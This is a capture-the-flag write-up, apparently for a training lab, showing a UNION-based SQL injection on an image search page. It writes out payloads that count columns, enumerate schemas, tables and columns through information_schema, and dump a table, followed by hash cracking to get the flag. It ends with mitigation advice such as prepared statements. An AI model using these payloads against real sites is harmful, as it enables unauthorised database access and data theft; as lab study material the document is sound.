# SQL Injection on Image Search Page
we realize there is an input field so we try a cheeky SQL Injection command
we try 

```tsx
1 OR 1=1
```

and realize it yield some results

```tsx
ID: 1 OR 1=1 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 OR 1=1 
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 1 OR 1=1 
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 1 OR 1=1 
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 1 OR 1=1 
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

so now we will try a SQL Injection with UNION : basically querying some valid data from the image table via 1 OR 1=1 → and using union to have more information via this query, from aother table or the same table on more columns. Issue is : we need to know how much columns you have on this query, so we run (with X starting from 1 to ..):

```tsx
1 ORDER by X --
```

until it breaks → it breaks at 2 so it returns two columns.

we can now try to get the table name with this UNION query : everything coming after the 5th line (Hack me?) will be result of the UNION : let’s get the current database name with 

```tsx
1 OR 1 = 1 UNION SELECT NULL, database() --  
```

we get 

```tsx
ID: 1 OR 1 = 1 UNION SELECT NULL, database() --   
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
ID: 1 OR 1 = 1 UNION SELECT NULL, database() --   
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42
ID: 1 OR 1 = 1 UNION SELECT NULL, database() --   
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go
ID: 1 OR 1 = 1 UNION SELECT NULL, database() --   
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med
ID: 1 OR 1 = 1 UNION SELECT NULL, database() --   
Title: Hack me ?
Url : borntosec.ddns.net/images.png

ID: 1 OR 1 = 1 UNION SELECT NULL, database() --   
Title: Member_images
Url : 
```

so we know we are in Member_images.

let’s get all the table : now we use the information_schema table and try to get 

```tsx
1 OR 1=1 UNION SELECT NULL, schema_name FROM information_schema.schemata
```

we get 

```tsx

[…]
ID: 1 OR 1=1 UNION SELECT NULL, schema_name FROM information_schema.schemata 
Title: Hack me ?
Url : borntosec.ddns.net/images.png

ID: 1 OR 1=1 UNION SELECT NULL, schema_name FROM information_schema.schemata 
Title: information_schema
Url : 

ID: 1 OR 1=1 UNION SELECT NULL, schema_name FROM information_schema.schemata 
Title: Member_Brute_Force
Url : 

ID: 1 OR 1=1 UNION SELECT NULL, schema_name FROM information_schema.schemata 
Title: Member_Sql_Injection
Url : 

ID: 1 OR 1=1 UNION SELECT NULL, schema_name FROM information_schema.schemata 
Title: Member_guestbook
Url : 

ID: 1 OR 1=1 UNION SELECT NULL, schema_name FROM information_schema.schemata 
Title: Member_images
Url : 

ID: 1 OR 1=1 UNION SELECT NULL, schema_name FROM information_schema.schemata 
Title: Member_survey
Url :
```

so there are 6 DB and we are in Member_images. let’s get all the tables and their names

```tsx
1 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables 
```

there is a ton of them but the very interesting ones are :

```tsx
ID: 1 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables  
Title: users
Url : Member_Sql_Injection

ID: 1 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables  
Title: guestbook
Url : Member_guestbook

ID: 1 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables  
Title: list_images
Url : Member_images
```

 but first to get the columns in those tables : as we know we can only select two columns with our unoins

```tsx
1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
```

for users we have

```tsx
Title: user_id
Title: first_name
Title: last_name
Title: town
Title: country
Title: planet
Title: Commentaire
Title: countersign
Url : users
```


let’s try a few columns with users:

```tsx
1 OR 1=1 UNION SELECT user_id, country FROM users
```

→ we have no result (probably no access to this db)

we now try with list_images :

```tsx
1 OR 1=1 UNION SELECT id, comment FROM list_images
```

```tsx
ID: 1 OR 1=1 UNION SELECT id, comment FROM list_images 
Title: Google it !
Url : 3
ID: 1 OR 1=1 UNION SELECT id, comment FROM list_images 
Title: Earth!
Url : 4
ID: 1 OR 1=1 UNION SELECT id, comment FROM list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 5

```

if we reverse the md5 for `1928e8083cf461a51303633093573c46` we have

`albatroz`

and `sha256()` applied to alabtroz is : 

`f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Security Implications & Mitigation

## Why This Attack Worked?
User Input Was Not Sanitized

The application directly inserted user input into an SQL query without validation.
Lack of Prepared Statements

The backend likely used string concatenation instead of parameterized queries.
Overly Permissive Database Access

The attacker could list schemas, tables, and columns.

## How to Prevent SQL Injection

### Use Prepared Statements
Instead of:

```php
$query = "SELECT * FROM images WHERE id = " . $_GET['id'];
```

Use:

```php
$stmt = $pdo->prepare("SELECT * FROM images WHERE id = ?");
$stmt->execute([$_GET['id']]);
```
### Sanitize and Validate Input
* Use allowlists for expected input values.
* Convert all user input into escaped values.
* Restrict Database Privileges
* Ensure the application user does not have access to information_schema.
* Use Web Application Firewalls (WAFs)